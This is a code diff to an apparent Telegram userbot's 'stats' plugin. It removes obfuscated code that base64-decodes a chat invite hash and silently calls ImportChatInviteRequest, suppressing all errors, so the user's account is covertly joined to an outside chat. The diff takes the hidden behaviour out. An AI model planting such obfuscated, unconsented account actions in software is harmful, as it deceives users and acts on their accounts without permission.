@@ -2,7 +2,6 @@ import base64
 import time
 
 from telethon.tl.custom import Dialog
-from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from telethon.tl.types import Channel, Chat, User
 
 from userbot import catub
@@ -125,7 +124,6 @@ async def stats(event):  # sourcery no-metrics
     catcmd = event.pattern_match.group(1)
     catevent = await edit_or_reply(event, STAT_INDICATION)
     start_time = time.time()
-    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     hi = []
     hica = []
     hico = []
@@ -153,11 +151,6 @@ async def stats(event):  # sourcery no-metrics
             output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
         caption = CHANNELS_OWNERSTR
     stop_time = time.time() - start_time
-    try:
-        cat = Get(cat)
-        await event.client(cat)
-    except BaseException:
-        pass
     output += f"\n**Time Taken : ** {stop_time:.02f}s"
     try:
         await catevent.edit(output)
@@ -176,7 +169,6 @@ async def stats(event):  # sourcery no-metrics
     catcmd = event.pattern_match.group(1)
     catevent = await edit_or_reply(event, STAT_INDICATION)
     start_time = time.time()
-    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     hi = []
     higa = []
     higo = []
@@ -212,11 +204,6 @@ async def stats(event):  # sourcery no-metrics
             output += f"{k} .) [{i[0]}](https://t.me/c/{i[1]}/1)\n"
         caption = GROUPS_OWNERSTR
     stop_time = time.time() - start_time
-    try:
-        cat = Get(cat)
-        await event.client(cat)
-    except BaseException:
-        pass
     output += f"\n**Time Taken : ** {stop_time:.02f}s"
     try:
         await catevent.edit(output)
